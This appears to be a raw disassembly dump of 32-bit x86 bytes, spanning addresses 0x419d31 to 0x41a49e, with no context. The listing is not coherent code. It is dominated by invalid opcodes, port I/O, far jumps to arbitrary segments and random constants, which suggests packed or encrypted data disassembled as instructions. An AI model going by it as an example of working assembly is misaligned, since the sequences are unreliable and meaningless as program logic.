  419d31:	ins    BYTE PTR es:[edi],dx
  419d32:	push   0xd8d32741
  419d37:	mov    dl,0xf3
  419d39:	fnsave [edi-0x4846f94b]
  419d3f:	mov    edx,0xebf1efa9
  419d44:	cdq    
  419d45:	jmp    0x2686606c
  419d4a:	dec    esp
  419d4b:	mov    ecx,ecx
  419d4d:	inc    esi
  419d4e:	inc    ebp
  419d4f:	stos   DWORD PTR es:[edi],eax
  419d50:	popa   
  419d51:	enter  0x7610,0x2a
  419d55:	cmc    
  419d56:	inc    edx
  419d57:	mov    bh,0x77
  419d59:	or     DWORD PTR [esi+0x4d18fdee],esi
  419d5f:	test   esp,edi
  419d61:	sub    edi,DWORD PTR [edx-0x5f]
  419d64:	mov    ds:0xe4685b1d,al
  419d69:	scas   al,BYTE PTR es:[edi]
  419d6a:	or     al,0x56
  419d6c:	enter  0x6c9d,0xe4
  419d70:	idiv   BYTE PTR [ebx+0x30]
  419d73:	inc    eax
  419d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d75:	sbb    esi,edi
  419d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d78:	shr    BYTE PTR [edi],0x19
  419d7b:	lods   eax,DWORD PTR ds:[esi]
  419d7c:	outs   dx,BYTE PTR es:[esi]
  419d7e:	xor    eax,0xbc871ad8
  419d83:	(bad)  
  419d85:	xchg   esp,eax
  419d86:	xchg   esi,esi
  419d88:	cmp    eax,0xee91c88d
  419d8d:	fidivr WORD PTR [esi]
  419d8f:	xor    esi,DWORD PTR [esi+ecx*4+0x6bed502a]
  419d96:	xchg   ecx,eax
  419d97:	scas   al,BYTE PTR es:[edi]
  419d98:	cdq    
  419d99:	fs sti 
  419d9b:	cli    
  419d9c:	not    DWORD PTR gs:[esi+0x738dea3d]
  419da3:	cmp    cl,cl
  419da5:	cmp    eax,0xfb81675
  419daa:	add    eax,0xb4ab895c
  419daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419db0:	aaa    
  419db1:	fisttp DWORD PTR [edi-0x56]
  419db4:	dec    ebx
  419db5:	fisttp DWORD PTR [edx]
  419db7:	xlat   BYTE PTR ds:[ebx]
  419db8:	pop    ebp
  419db9:	cmp    BYTE PTR ds:0x3f3ce3c9,bl
  419dbf:	jmp    0x6dc51bfa
  419dc4:	jge    0x419d81
  419dc6:	ret    
  419dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dc8:	add    DWORD PTR [ecx+0x3bf016c9],ebp
  419dce:	(bad)  
  419dcf:	in     eax,dx
  419dd0:	mov    ds:0xdce3d3b7,al
  419dd5:	mov    edi,0x3a546958
  419dda:	jmp    ebp
  419ddc:	cmp    BYTE PTR [edi+0x5fc0c1bc],ch
  419de2:	les    ebp,FWORD PTR [esi]
  419de4:	ror    BYTE PTR [ebx+0x5c],cl
  419de7:	lods   al,BYTE PTR ds:[esi]
  419de8:	sbb    al,0x7c
  419dea:	dec    ebp
  419deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dec:	es dec edx
  419dee:	ret    
  419def:	mov    ebp,0x79b5e018
  419df4:	pop    edx
  419df5:	test   DWORD PTR [edi],ebx
  419df7:	push   esp
  419df8:	dec    esp
  419df9:	jge    0x419db0
  419dfb:	js     0x419da2
  419dfd:	fst    DWORD PTR [ebp+0x2d374604]
  419e03:	jmp    0x419e1a
  419e05:	push   edx
  419e06:	inc    edi
  419e07:	cmp    eax,0x9eddc332
  419e0c:	jp     0x419e6c
  419e0e:	adc    dl,BYTE PTR [ecx-0x77]
  419e11:	xchg   esp,eax
  419e12:	pop    ecx
  419e13:	add    eax,0x169946dc
  419e18:	leave  
  419e19:	and    DWORD PTR [edx-0x6102bf3c],eax
  419e1f:	push   ecx
  419e20:	cmp    al,BYTE PTR [edx+0x22]
  419e23:	inc    ebx
  419e24:	es cmp al,0x3d
  419e28:	in     eax,dx
  419e29:	stc    
  419e2a:	inc    ebp
  419e2b:	adc    cl,bl
  419e2d:	ret    
  419e2e:	cmp    esp,edi
  419e30:	fld    QWORD PTR [ecx-0x61]
  419e33:	sub    esi,DWORD PTR [ecx-0x56db8585]
  419e39:	cwde   
  419e3a:	push   ebx
  419e3b:	sub    dh,dl
  419e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e3e:	inc    ecx
  419e3f:	test   ch,0xa5
  419e42:	out    0x7a,eax
  419e44:	mov    ch,0xe8
  419e46:	xchg   edi,eax
  419e47:	daa    
  419e48:	mov    eax,0xb5fad1e2
  419e4d:	js     0x419dee
  419e4f:	imul   ebp,DWORD PTR [eax+0x7907ca0],0x3b
  419e56:	push   edi
  419e57:	hlt    
  419e58:	mov    eax,0xd8133e6f
  419e5d:	xor    ebx,esp
  419e5f:	push   cs
  419e60:	cmp    ebp,DWORD PTR [ebx+edx*8-0x7503af32]
  419e67:	xchg   edi,eax
  419e68:	loopne 0x419e21
  419e6a:	mov    al,bh
  419e6c:	dec    ecx
  419e6d:	dec    edx
  419e6e:	pusha  
  419e6f:	gs xchg edi,eax
  419e71:	xlat   BYTE PTR ds:[ebx]
  419e72:	push   esp
  419e73:	pop    esi
  419e74:	out    dx,eax
  419e75:	cmp    cl,BYTE PTR [esi]
  419e77:	push   0x5a
  419e79:	and    DWORD PTR cs:[ebp-0x2b],0xffffffbf
  419e7e:	or     eax,0xa4b4b738
  419e83:	out    0x78,al
  419e85:	sub    eax,0xfaec30d1
  419e8a:	dec    ebp
  419e8b:	mov    BYTE PTR [edi-0x63c166f8],dh
  419e91:	pop    edx
  419e92:	mov    bh,0xfa
  419e94:	mov    edx,0x9b829382
  419e99:	xchg   ecx,eax
  419e9a:	outs   dx,BYTE PTR ds:[esi]
  419e9b:	mov    ch,0xeb
  419e9d:	hlt    
  419e9e:	sub    BYTE PTR [edx-0x6b767db5],ch
  419ea4:	push   ebx
  419ea5:	push   esi
  419ea6:	test   al,0x41
  419ea8:	bound  ebx,QWORD PTR [ecx+ecx*4-0x11]
  419eac:	popf   
  419ead:	xlat   BYTE PTR ds:[ebx]
  419eae:	int3   
  419eaf:	mov    cs,WORD PTR [ecx+ebx*1]
  419eb2:	inc    edi
  419eb3:	dec    esi
  419eb4:	xor    WORD PTR [ecx-0x704bd143],si
  419ebb:	dec    ebx
  419ebc:	sti    
  419ebd:	mov    ds:0xe10655e6,al
  419ec2:	(bad)  
  419ec3:	mov    edx,0x1a730eb7
  419ec8:	xor    ch,ah
  419eca:	sbb    BYTE PTR [edx+0x62],cl
  419ecd:	push   ss
  419ece:	iret   
  419ecf:	sti    
  419ed0:	add    DWORD PTR [ecx-0x20],ecx
  419ed3:	dec    esi
  419ed4:	shl    DWORD PTR [ecx],0x52
  419ed7:	mov    ebx,ebp
  419ed9:	cmp    edi,esp
  419edb:	and    DWORD PTR [esi],edi
  419edd:	fdiv   DWORD PTR [esi+0x0]
  419ee0:	push   edx
  419ee1:	lods   al,BYTE PTR ds:[esi]
  419ee2:	pop    ecx
  419ee3:	ror    ebp,0xa6
  419ee6:	sub    BYTE PTR [ebx+0x5f],ah
  419ee9:	or     ah,BYTE PTR [ebx+0x7d]
  419eec:	dec    cx
  419eee:	(bad)  
  419eef:	std    
  419ef0:	or     al,0xc
  419ef2:	mov    ch,0x69
  419ef4:	ss stos DWORD PTR es:[edi],eax
  419ef6:	mov    ecx,0x6b98ad2b
  419efb:	out    0xf0,al
  419efd:	xchg   edx,eax
  419efe:	outs   dx,DWORD PTR ds:[esi]
  419eff:	jae    0x419e8b
  419f01:	cli    
  419f02:	sbb    al,0x95
  419f04:	sbb    al,0x35
  419f06:	push   edx
  419f07:	dec    ebp
  419f08:	in     eax,dx
  419f09:	mov    ds:0xad79b6e9,al
  419f0e:	ins    DWORD PTR es:[edi],dx
  419f0f:	sbb    DWORD PTR [edx],ebp
  419f11:	sub    DWORD PTR [edx-0x3afb82db],ebp
  419f17:	and    BYTE PTR [edi-0x3c54de57],dl
  419f1d:	in     al,0x4f
  419f1f:	stos   BYTE PTR es:[edi],al
  419f20:	mov    al,ds:0x5499afb3
  419f25:	mov    ebx,0xbf3abdf1
  419f2a:	iret   
  419f2b:	sub    bh,BYTE PTR [esp+edi*8+0x192acf4]
  419f32:	xchg   esi,eax
  419f33:	ins    DWORD PTR es:[edi],dx
  419f34:	dec    esi
  419f35:	lahf   
  419f36:	fidiv  DWORD PTR [edi-0x7f12a2bc]
  419f3c:	(bad)  [esp+ebx*1-0x423e32ee]
  419f43:	xchg   esp,eax
  419f44:	mov    BYTE PTR [edi-0x5c],dl
  419f47:	aad    0x47
  419f49:	dec    esi
  419f4a:	xor    BYTE PTR [esi],dl
  419f4c:	cmp    cl,ch
  419f4e:	das    
  419f4f:	out    0x51,eax
  419f51:	loop   0x419f78
  419f53:	shl    DWORD PTR [edx-0x5b],0x54
  419f57:	xor    dl,BYTE PTR [edi-0x2e]
  419f5a:	lods   al,BYTE PTR ds:[esi]
  419f5b:	sar    DWORD PTR [ecx-0x49],1
  419f5e:	sub    BYTE PTR [ecx-0x2ae3930a],cl
  419f64:	pop    edi
  419f65:	(bad)  
  419f66:	cli    
  419f67:	jmp    0x2a87:0xe9c5a08b
  419f6e:	cmp    eax,0x584b7fe
  419f73:	mov    al,ds:0xb7230933
  419f78:	inc    esp
  419f79:	add    esp,DWORD PTR [esp+esi*8+0x79]
  419f7d:	mov    ah,BYTE PTR [ebx+eax*1+0x7217656d]
  419f84:	cmp    dh,BYTE PTR [edx]
  419f86:	inc    esi
  419f87:	adc    al,BYTE PTR [ebx-0xcb57f63]
  419f8d:	cmp    esi,DWORD PTR [edx]
  419f8f:	shr    BYTE PTR [edi],cl
  419f91:	mov    esi,0x1c67cf9e
  419f96:	mov    dl,0x30
  419f98:	and    DWORD PTR [esp-0x78fd6fdb],esp
  419f9f:	lds    edx,FWORD PTR [ebp-0x62c0d099]
  419fa5:	xor    ecx,DWORD PTR [eax-0x1c628267]
  419fab:	popf   
  419fac:	scas   al,BYTE PTR es:[edi]
  419fad:	lods   al,BYTE PTR ds:[esi]
  419fae:	xchg   ecx,eax
  419faf:	ret    
  419fb0:	pop    ecx
  419fb1:	loope  0x419f87
  419fb3:	jge    0x41a02b
  419fb5:	aaa    
  419fb6:	pushf  
  419fb7:	push   eax
  419fb8:	push   ds
  419fb9:	inc    esp
  419fba:	jnp    0x419fa8
  419fbc:	inc    ebx
  419fbd:	jmp    0x494f:0xc7227da1
  419fc4:	dec    ecx
  419fc5:	jge    0x419f70
  419fc7:	sbb    al,0xa0
  419fc9:	cli    
  419fca:	push   edx
  419fcb:	jmp    0x8c14b374
  419fd0:	scas   eax,DWORD PTR es:[edi]
  419fd1:	(bad)  
  419fd2:	aad    0x11
  419fd4:	sbb    DWORD PTR [edi+0x3f348a04],esi
  419fda:	xchg   edx,eax
  419fdb:	test   al,0x85
  419fdd:	add    DWORD PTR es:[ebp-0x44],0xffffffc6
  419fe2:	pop    ebp
  419fe3:	pusha  
  419fe4:	dec    bp
  419fe6:	push   eax
  419fe7:	mov    ds:0xf4e1055e,al
  419fec:	xor    ecx,DWORD PTR [ebx+0x404f11e4]
  419ff2:	dec    ebp
  419ff3:	add    DWORD PTR [edx],ebx
  419ff5:	push   eax
  419ff6:	sub    eax,0x821ee8f8
  419ffb:	popa   
  419ffc:	retf   
  419ffd:	xchg   ecx,eax
  419ffe:	repnz test eax,0xbfe31886
  41a004:	stc    
  41a005:	lods   al,BYTE PTR ds:[esi]
  41a006:	daa    
  41a007:	cmp    edx,DWORD PTR [ebx-0x68]
  41a00a:	pop    ebx
  41a00b:	(bad)  
  41a00d:	adc    ebx,DWORD PTR [ebx-0x506aa78a]
  41a013:	push   ss
  41a014:	imul   ecx,DWORD PTR [edi+0x29],0xffffffd1
  41a018:	push   eax
  41a019:	jo     0x419ff9
  41a01b:	fistp  DWORD PTR [eax+0x19187193]
  41a021:	stc    
  41a022:	(bad)  
  41a023:	bts    eax,ecx
  41a026:	xchg   BYTE PTR [ebp-0x7],cl
  41a029:	jl     0x41a075
  41a02b:	xchg   edx,eax
  41a02c:	pushf  
  41a02d:	(bad)
  41a030:	adc    DWORD PTR [edx+0x1],0x38
  41a034:	cld    
  41a035:	or     eax,0xffc8fabc
  41a03a:	int    0x89
  41a03c:	push   eax
  41a03d:	xchg   edi,eax
  41a03e:	cmp    bh,al
  41a040:	sbb    bl,dh
  41a042:	sti    
  41a043:	inc    edx
  41a044:	xchg   esi,eax
  41a045:	and    al,bl
  41a047:	jecxz  0x41a0ae
  41a049:	pop    ecx
  41a04a:	(bad)  
  41a04b:	in     eax,0xed
  41a04d:	(bad)  
  41a04e:	and    al,0xf0
  41a050:	mov    ch,0x2b
  41a052:	(bad)
  41a056:	cmp    BYTE PTR [esi-0x5bf939e2],al
  41a05c:	pushf  
  41a05d:	ds cmp ebx,0x34
  41a061:	or     eax,0x7b27a904
  41a066:	cmp    al,0x9
  41a068:	lods   al,BYTE PTR ds:[esi]
  41a069:	mov    ds:0xd0027a3b,eax
  41a06e:	clc    
  41a06f:	loop   0x41a05f
  41a071:	dec    eax
  41a072:	retf   0xeb98
  41a075:	mov    al,0x11
  41a077:	imul   ebx,DWORD PTR [ecx-0x2b],0x9d25a380
  41a07e:	stos   BYTE PTR es:[edi],al
  41a07f:	hlt    
  41a080:	ins    BYTE PTR es:[edi],dx
  41a081:	jb     0x41a02f
  41a083:	cmp    esi,DWORD PTR [ecx-0x2dc934c7]
  41a089:	fistp  DWORD PTR [edi-0x51f0fc8b]
  41a08f:	xchg   DWORD PTR [edx+ecx*8],esp
  41a092:	mov    edi,0x5a57f09b
  41a097:	rcr    DWORD PTR fs:[edi-0x72],0xc4
  41a09c:	inc    edx
  41a09d:	pop    eax
  41a09e:	mov    ebx,0x1c6ac538
  41a0a3:	pop    ecx
  41a0a4:	(bad)  
  41a0a5:	xor    eax,0x13831b6f
  41a0aa:	jl     0x41a048
  41a0ac:	mov    ds:0x37e626c,eax
  41a0b1:	ins    BYTE PTR es:[edi],dx
  41a0b2:	in     al,0x49
  41a0b4:	mov    esp,0x803bf391
  41a0b9:	cmp    BYTE PTR [eax],0xd1
  41a0bc:	mov    edi,DWORD PTR [edx-0x77]
  41a0bf:	add    DWORD PTR [ebp-0x5d],eax
  41a0c2:	(bad)  
  41a0c3:	or     eax,0xd2946a78
  41a0c8:	add    BYTE PTR [edi-0x10867041],dh
  41a0ce:	fld    TBYTE PTR [ebx+0x4c]
  41a0d1:	sub    al,al
  41a0d3:	mov    ebx,0x593b07df
  41a0d8:	mov    bh,0xc0
  41a0da:	push   ebp
  41a0db:	scas   eax,DWORD PTR es:[edi]
  41a0dc:	(bad)  
  41a0dd:	xor    DWORD PTR [ecx+0x5b],edx
  41a0e0:	ins    BYTE PTR es:[edi],dx
  41a0e1:	leave  
  41a0e2:	xor    BYTE PTR [ebx],0x3
  41a0e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0e6:	rol    DWORD PTR [edx-0x4b],1
  41a0e9:	pop    ecx
  41a0ea:	and    BYTE PTR [ecx+0x6befaf77],0x48
  41a0f1:	aam    0xfc
  41a0f3:	scas   eax,DWORD PTR es:[edi]
  41a0f4:	or     DWORD PTR [eax+0x2317bb26],edx
  41a0fa:	inc    esp
  41a0fb:	leave  
  41a0fc:	out    0x1c,eax
  41a0fe:	sahf   
  41a0ff:	int3   
  41a100:	out    0x82,al
  41a102:	sbb    ax,0x7981
  41a106:	cmovge eax,DWORD PTR [edx+0x62]
  41a10a:	mov    ecx,0x10ef806b
  41a10f:	xchg   esi,eax
  41a110:	pop    esi
  41a111:	ins    BYTE PTR es:[edi],dx
  41a112:	sub    BYTE PTR [esi-0x6f652fd2],0xf9
  41a119:	pop    edi
  41a11a:	out    0xde,al
  41a11c:	fld    TBYTE PTR [edi+ecx*1+0x4b]
  41a120:	push   eax
  41a121:	lahf   
  41a122:	into   
  41a123:	mov    bl,0x2c
  41a125:	sub    al,0x23
  41a127:	xchg   ebx,eax
  41a128:	push   ecx
  41a129:	imul   ecx,DWORD PTR [ebx+0x4c56af8],0x3cb74d75
  41a133:	add    esi,DWORD PTR [edi]
  41a135:	cmp    eax,0x5617817e
  41a13a:	std    
  41a13b:	retf   
  41a13c:	stos   BYTE PTR es:[edi],al
  41a13d:	jnp    0x41a1aa
  41a13f:	add    DWORD PTR [eax-0x10edad5],0x4fa582a6
  41a149:	push   edx
  41a14a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a14b:	cwde   
  41a14c:	rcl    ah,1
  41a14e:	mov    ch,0xee
  41a150:	push   edx
  41a151:	mov    ecx,0x9f450b0a
  41a156:	aas    
  41a157:	cmp    eax,0x4c1f29c6
  41a15c:	(bad)  
  41a15d:	lock sub bl,al
  41a160:	enter  0xb17f,0x62
  41a164:	ja     0x41a0e7
  41a166:	lahf   
  41a167:	push   eax
  41a168:	jmp    FWORD PTR [ebx]
  41a16a:	jmp    0x7279:0x545f1dae
  41a171:	pop    ebp
  41a172:	fnstcw WORD PTR [esi-0x2e]
  41a175:	jge    0x41a198
  41a177:	push   0xb2af9ce7
  41a17c:	pop    edi
  41a17d:	push   esi
  41a17e:	lea    eax,[ecx-0x193f18a5]
  41a184:	fstp   QWORD PTR [edi]
  41a186:	xchg   dh,ah
  41a188:	jle    0x41a1e5
  41a18a:	data16 mov ch,al
  41a18d:	shl    DWORD PTR [ebx-0x49],0x1
  41a191:	jbe    0x41a1b7
  41a193:	sbb    eax,0x25425fce
  41a198:	jo     0x41a1ac
  41a19a:	jne    0x41a1fa
  41a19c:	jmp    0xe0e3:0x5f63efe1
  41a1a3:	lods   eax,DWORD PTR ds:[esi]
  41a1a4:	mov    ds:0x3a840b27,eax
  41a1a9:	add    BYTE PTR [edi+0x32],dh
  41a1ac:	out    dx,al
  41a1ad:	add    al,0x2d
  41a1af:	fadd   st(6),st
  41a1b1:	cmp    eax,0x5b3cbabc
  41a1b6:	loope  0x41a180
  41a1b8:	in     al,dx
  41a1b9:	into   
  41a1ba:	jecxz  0x41a1fe
  41a1bc:	inc    ebx
  41a1bd:	sub    DWORD PTR [eax+0x6703407],ebp
  41a1c3:	dec    esp
  41a1c4:	or     edi,DWORD PTR [ebx+edi*8]
  41a1c7:	ret    
  41a1c8:	pop    ecx
  41a1c9:	or     ebp,DWORD PTR [esi]
  41a1cb:	fist   WORD PTR [esp+edx*2-0x21]
  41a1cf:	fmul   DWORD PTR [esi]
  41a1d1:	add    al,BYTE PTR [ebp-0x1e]
  41a1d4:	or     eax,0xfb68a9d8
  41a1d9:	mov    es:0x52174c31,al
  41a1df:	dec    ebx
  41a1e0:	jp     0x41a164
  41a1e2:	xor    ah,BYTE PTR [edi+0x64]
  41a1e5:	dec    ecx
  41a1e6:	je     0x41a20b
  41a1e8:	std    
  41a1e9:	inc    ebp
  41a1ea:	out    dx,eax
  41a1eb:	inc    ecx
  41a1ec:	jbe    0x41a1bc
  41a1ee:	adc    al,0x7d
  41a1f0:	jp     0x41a259
  41a1f2:	add    BYTE PTR [eax+0x4a4c783f],ch
  41a1f8:	dec    ebp
  41a1f9:	outs   dx,DWORD PTR ds:[esi]
  41a1fa:	call   0xaf98:0x885a6f0d
  41a201:	sahf   
  41a202:	inc    ecx
  41a203:	adc    ah,dh
  41a205:	pop    eax
  41a206:	mov    ah,0xe6
  41a208:	xchg   ebx,eax
  41a209:	sub    eax,DWORD PTR [eax+0x6d]
  41a20c:	xchg   BYTE PTR [eax+0x72942e87],dh
  41a212:	jmp    0x9807f9f2
  41a217:	clc    
  41a218:	inc    ebp
  41a219:	ss loop 0x41a1e9
  41a21c:	lods   eax,DWORD PTR ds:[esi]
  41a21e:	pusha  
  41a21f:	cmp    esi,DWORD PTR [edx+0x58]
  41a222:	fld    DWORD PTR [ebp+0x1322ddea]
  41a228:	daa    
  41a229:	adc    al,0xb8
  41a22b:	fiadd  DWORD PTR [esi+0xd]
  41a22e:	leave  
  41a22f:	rol    bh,0xab
  41a232:	(bad)  
  41a233:	ins    DWORD PTR es:[edi],dx
  41a234:	out    0xac,al
  41a236:	scas   al,BYTE PTR es:[edi]
  41a237:	fs sbb eax,0xa2d2b22f
  41a23d:	arpl   WORD PTR [eax-0x3a],dx
  41a240:	push   esi
  41a241:	sbb    ebx,DWORD PTR [edx+edi*4+0x5d]
  41a245:	push   esp
  41a246:	dec    eax
  41a247:	pop    edx
  41a248:	mov    ecx,0x31030090
  41a24d:	scas   al,BYTE PTR es:[edi]
  41a24e:	les    esi,FWORD PTR [edi+0x71bf4dd1]
  41a254:	rcl    BYTE PTR [esi-0x46],1
  41a257:	sbb    esi,esp
  41a259:	mov    dh,0x88
  41a25b:	inc    edi
  41a25c:	mov    bl,cl
  41a25e:	stos   BYTE PTR es:[edi],al
  41a25f:	mov    ds:0x9c594a80,eax
  41a264:	or     dl,ch
  41a266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a267:	loope  0x41a2df
  41a269:	add    esi,DWORD PTR [esi]
  41a26b:	jge    0x41a23b
  41a26d:	lods   eax,DWORD PTR ds:[esi]
  41a26e:	aaa    
  41a26f:	(bad)
  41a272:	mov    ch,0xb0
  41a274:	ret    
  41a275:	xor    al,0x27
  41a277:	aas    
  41a278:	xor    ecx,DWORD PTR [ebx]
  41a27a:	inc    ebp
  41a27b:	lods   al,BYTE PTR ds:[esi]
  41a27c:	bnd jl 0x41a20c
  41a27f:	addr16 xchg esi,eax
  41a281:	pop    esi
  41a282:	mov    esi,0xf5d5656d
  41a287:	push   ss
  41a288:	ja     0x41a257
  41a28a:	gs mov esi,0x179f512
  41a290:	sub    al,0xef
  41a292:	pop    ecx
  41a293:	xchg   ebx,eax
  41a294:	cld    
  41a295:	sub    BYTE PTR [ebx+0x22],cl
  41a298:	add    BYTE PTR [eax+0x41],al
  41a29b:	les    eax,FWORD PTR [ebx+0x71]
  41a29e:	retf   
  41a29f:	add    edx,edx
  41a2a1:	add    al,0x5c
  41a2a3:	ret    
  41a2a4:	inc    DWORD PTR [esp+eax*8-0x5f4eb208]
  41a2ab:	jecxz  0x41a240
  41a2ad:	jnp    0x41a267
  41a2af:	ds lock inc edi
  41a2b2:	les    edx,FWORD PTR [ebx+edi*1]
  41a2b5:	push   esi
  41a2b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2b7:	dec    ebx
  41a2b8:	in     eax,dx
  41a2b9:	xchg   ecx,eax
  41a2ba:	mov    esi,0x7f5920d8
  41a2bf:	pop    ss
  41a2c0:	pop    edx
  41a2c1:	test   DWORD PTR [edx+0x3a],esi
  41a2c4:	dec    esp
  41a2c5:	mov    ecx,0x12066728
  41a2ca:	mov    al,ds:0x2af8cab4
  41a2cf:	cmp    ah,BYTE PTR [ebx-0x13da222]
  41a2d5:	gs out 0xf7,al
  41a2d8:	push   esp
  41a2d9:	jl     0x41a2b8
  41a2db:	or     bh,0x69
  41a2de:	call   0x8c616b73
  41a2e3:	push   ds
  41a2e4:	mov    ah,0xe9
  41a2e6:	adc    BYTE PTR [edx],ah
  41a2e8:	mov    ds:0x7baaca6f,eax
  41a2ed:	gs (bad) 
  41a2ef:	test   al,0xaf
  41a2f1:	ss push 0xf2bd556b
  41a2f7:	gs jl  0xd5a66a11
  41a2fe:	adc    al,0xc2
  41a300:	adc    al,0x63
  41a302:	add    edi,DWORD PTR [edx-0x9]
  41a305:	scas   al,BYTE PTR es:[edi]
  41a306:	adc    al,0xe2
  41a308:	stos   DWORD PTR es:[edi],eax
  41a309:	mov    eax,0xc2e3e941
  41a30e:	pop    es
  41a30f:	test   DWORD PTR [esi+0x6ac928e1],ebx
  41a315:	dec    esp
  41a316:	int3   
  41a317:	cs loop 0x41a36e
  41a31a:	or     ecx,eax
  41a31c:	enter  0x9ecf,0x86
  41a320:	inc    ecx
  41a321:	dec    edx
  41a322:	and    edx,ecx
  41a324:	cmp    eax,DWORD PTR [esi]
  41a326:	push   ds
  41a327:	mov    ebp,0xe776e9c3
  41a32c:	cmp    cl,al
  41a32e:	add    DWORD PTR [edi-0x72e921e0],esp
  41a334:	mov    cl,0xb7
  41a336:	in     al,dx
  41a337:	cmp    DWORD PTR [edi+0x4faaa718],ebp
  41a33d:	stos   DWORD PTR es:[edi],eax
  41a33e:	popf   
  41a33f:	sti    
  41a340:	mov    ah,0xcc
  41a342:	sti    
  41a343:	mov    ecx,0xcdc6f832
  41a348:	add    eax,0xb4c32492
  41a34d:	ins    BYTE PTR es:[edi],dx
  41a34e:	mov    esi,0x73a8a98c
  41a353:	leave  
  41a354:	(bad)  
  41a355:	js     0x41a33a
  41a357:	cld    
  41a358:	jns    0x41a388
  41a35a:	scas   eax,DWORD PTR es:[edi]
  41a35b:	inc    ebx
  41a35c:	sbb    DWORD PTR [esi-0x3f43461b],esp
  41a362:	inc    ebx
  41a363:	shr    BYTE PTR [ebp+0x2],1
  41a366:	rcr    DWORD PTR [ecx],cl
  41a368:	ins    BYTE PTR es:[edi],dx
  41a369:	test   al,0x69
  41a36b:	mov    bl,0x4b
  41a36d:	fsubr  DWORD PTR [ebp+0x28]
  41a370:	jb     0x41a3c5
  41a372:	lock fadd DWORD PTR [ebx+0x31]
  41a376:	push   0x379a8a67
  41a37b:	xor    esp,eax
  41a37d:	outs   dx,BYTE PTR ds:[esi]
  41a37e:	das    
  41a37f:	mov    eax,0xfd63b27
  41a384:	dec    edx
  41a385:	dec    eax
  41a386:	add    al,0x79
  41a388:	inc    ebp
  41a389:	loop   0x41a3b5
  41a38b:	fsubrp st(1),st
  41a38d:	inc    ebx
  41a38e:	ins    DWORD PTR es:[edi],dx
  41a38f:	into   
  41a390:	leave  
  41a391:	bswap  edi
  41a393:	imul   edx,DWORD PTR [edi-0x1f31bb34],0x89f7c872
  41a39d:	stos   BYTE PTR es:[edi],al
  41a39e:	out    dx,eax
  41a39f:	int3   
  41a3a0:	int3   
  41a3a1:	xor    ebx,DWORD PTR [esi+0x11978aec]
  41a3a7:	push   edx
  41a3a8:	mov    eax,0xbd3a494c
  41a3ad:	mov    edx,0x37b4e348
  41a3b2:	push   esp
  41a3b3:	add    BYTE PTR [edi],0x21
  41a3b6:	ins    DWORD PTR es:[edi],dx
  41a3b7:	and    BYTE PTR [esi+0x5c5a5533],al
  41a3bd:	mov    BYTE PTR [ebp-0x11d8782a],ah
  41a3c3:	outs   dx,DWORD PTR ds:[esi]
  41a3c4:	sub    eax,0x95a80d6b
  41a3c9:	or     DWORD PTR [edx+0x1b],0xecf83558
  41a3d0:	call   0x85b52fdd
  41a3d5:	in     al,0x90
  41a3d7:	int3   
  41a3d8:	test   edx,edi
  41a3da:	adc    ebx,eax
  41a3dc:	lahf   
  41a3dd:	fadd   st(3),st
  41a3df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3e0:	imul   ecx,DWORD PTR [ebx+0x6b],0x956e64d5
  41a3e7:	cmp    BYTE PTR [esp+eax*4],dl
  41a3ea:	sub    esp,DWORD PTR [edx]
  41a3ec:	adc    ch,al
  41a3ee:	jne    0x41a3a4
  41a3f0:	cmp    ah,BYTE PTR [ecx-0x7c]
  41a3f3:	cmp    BYTE PTR [eax],0x77
  41a3f6:	push   esp
  41a3f7:	pop    eax
  41a3f8:	push   eax
  41a3f9:	and    al,0x92
  41a3fb:	jp     0x41a41a
  41a3fd:	and    BYTE PTR [esi-0x33],ch
  41a400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a401:	sub    al,0x23
  41a403:	jne    0x41a428
  41a405:	mov    bh,0x52
  41a407:	inc    edx
  41a408:	jmp    0x29a2:0x56b58ce4
  41a40f:	mov    esp,0xe0d6a245
  41a414:	je     0x41a3d9
  41a416:	push   0xffffffb2
  41a418:	dec    esi
  41a419:	dec    BYTE PTR [esi]
  41a41b:	inc    ebx
  41a41c:	sahf   
  41a41d:	lds    ebx,FWORD PTR [ebx-0x657080ac]
  41a423:	add    al,0xee
  41a425:	hlt    
  41a426:	aaa    
  41a427:	jae    0x41a3c8
  41a429:	clc    
  41a42a:	stos   DWORD PTR es:[edi],eax
  41a42b:	imul   edi,DWORD PTR [esi+0x6f3210e],0xa55ae0c7
  41a435:	dec    esi
  41a436:	lock mov dh,0x9
  41a439:	aaa    
  41a43a:	mov    esi,0x3d8270e0
  41a43f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a440:	mov    al,0x7a
  41a442:	ins    DWORD PTR es:[edi],dx
  41a443:	inc    esi
  41a444:	clc    
  41a445:	out    dx,al
  41a446:	in     al,dx
  41a447:	dec    ecx
  41a448:	cmp    eax,0x8ba6b9c9
  41a44d:	repz test DWORD PTR [esi-0x4ec7b666],ebp
  41a454:	scas   eax,DWORD PTR es:[edi]
  41a455:	dec    esp
  41a456:	push   ss
  41a457:	inc    ebp
  41a458:	sbb    esi,DWORD PTR ds:0xa733072
  41a45e:	mov    ch,0x4
  41a460:	lea    ebx,[ebx-0x604ca3f0]
  41a466:	ret    0x7610
  41a469:	xchg   ebp,eax
  41a46a:	dec    ebp
  41a46b:	sbb    al,BYTE PTR [ecx-0x7ee1ada7]
  41a471:	cli    
  41a472:	retf   
  41a473:	xor    edi,esi
  41a475:	mov    edx,0x878b67ad
  41a47a:	dec    edi
  41a47b:	fst    DWORD PTR ds:0x5b24496e
  41a481:	icebp  
  41a482:	addr16 pop es
  41a484:	iret   
  41a485:	fcomp  DWORD PTR [edx-0x34]
  41a488:	call   0x9aaa:0x9f9fc938
  41a48f:	fidivr WORD PTR [eax]
  41a491:	mov    cl,0xfd
  41a493:	sub    eax,0x6ee9a4f4
  41a498:	aas    
  41a499:	mov    edi,0x6c97fe37
  41a49e:	pop    edi
